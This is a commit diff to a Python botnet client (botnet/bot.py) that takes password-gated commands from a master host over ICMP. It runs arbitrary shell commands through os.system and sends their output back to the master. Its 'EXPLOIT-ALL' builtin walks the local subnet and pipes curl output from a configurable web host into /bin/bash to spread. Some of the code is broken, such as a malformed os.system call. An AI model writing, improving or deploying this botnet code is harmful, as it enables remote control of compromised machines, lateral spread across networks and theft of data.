Major Fixes and Improvements

+++ botnet/bot.py
@@ -28,39 +28,41 @@ class Handler(threading.Thread):
 	
 		raw = self.q.get()
 		print(raw)
-		if self.passwd in raw:	#Is this legit data?
-			if "----->" in raw:	#Is this a builtin?
-				builtin = raw.strip(self.passwd).split("----->")
-				if builtin[0] == "SET-MASTER":
-					self.master = builtin[1]
-				elif builtin[0] == "SET-PASS":
-					self.passwd = builtin[1]
-				elif builtin[0] == "SET-WEB":
-					self.web = builtin[1]
-				elif builtin[0] == "RESET-EMERGENCY-OMG":
-					self.passwd = "DEFAULT-HARDCODED"
-					self.web = "www.DEFAULT.com"
-				elif builtin[0] == "EXPLOIT-ALL":
-					octets = localhost.split(".")
-					for i in range(1,253):
-						if i != octets[3]:
-							try:
-								os.system("curl ", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i)+ "|/bin/bash")
-							except subprocess.CalledProcessError as e:
-								pass	
-			else:
-				print self.passwd
-				cmd = raw[len(self.passwd):]
-				print("RECEIVED: "+cmd)
-				try:
-					os.system(cmd + " > /tmp/tmp.dat")
-					out = subprocess.check_output(["cat", "/tmp/tmp.dat"])
-					os.system("rm -f /tmp/tmp.dat")
-					print("OUT: "+str(out))
-					send_icmp(localhost, self.master, localhost+">>\n"+out)
-				except subprocess.CalledProcessError as e:
-					send_icmp(localhost, self.master, localhost+">>\n"+e.output)
-
+		if raw != None:
+		
+			if self.passwd in raw:	#Is this legit data?
+				if "----->" in raw:	#Is this a builtin?
+					builtin = raw.strip(self.passwd).split("----->")
+					if builtin[0] == "SET-MASTER":
+						self.master = builtin[1]
+					elif builtin[0] == "SET-PASS":
+						self.passwd = builtin[1]
+					elif builtin[0] == "SET-WEB":
+						self.web = builtin[1]
+					elif builtin[0] == "RESET-EMERGENCY-OMG":
+						self.passwd = "DEFAULT-HARDCODED"
+						self.web = "www.DEFAULT.com"
+					elif builtin[0] == "EXPLOIT-ALL":
+						octets = localhost.split(".")
+						for i in range(1,253):
+							if i != octets[3]:
+								try:
+									os.system("curl ", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i)+ "|/bin/bash")
+								except subprocess.CalledProcessError as e:
+									pass	
+				else:
+					print self.passwd
+					cmd = raw[len(self.passwd):]
+					print("RECEIVED: "+cmd)
+					try:
+						os.system(cmd + " > /tmp/tmp.dat")
+						out = subprocess.check_output(["cat", "/tmp/tmp.dat"])
+						os.system("rm -f /tmp/tmp.dat")
+						print("OUT: "+str(out))
+						send_icmp(localhost, self.master, localhost+">>\n"+out)
+					except subprocess.CalledProcessError as e:
+						send_icmp(localhost, self.master, localhost+">>\nERROR")
+	
 def init():
 	print("Bot started...["+localhost+"]")
 	send_icmp(localhost, MASTER, "NEW-BOT-INIT:"+localhost)
